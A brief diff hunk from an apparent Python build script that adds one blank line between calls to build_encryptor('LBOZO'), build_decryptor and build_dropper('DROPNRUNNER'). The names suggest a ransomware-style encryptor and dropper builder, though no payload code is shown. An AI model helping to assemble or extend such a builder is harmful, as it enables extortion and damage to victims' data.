@@ -67,6 +67,7 @@ def build_dropper(dropper_name):
 
 
 build_encryptor("LBOZO")
+
 build_decryptor("LBOZODecryptor")
 
 build_dropper("DROPNRUNNER")
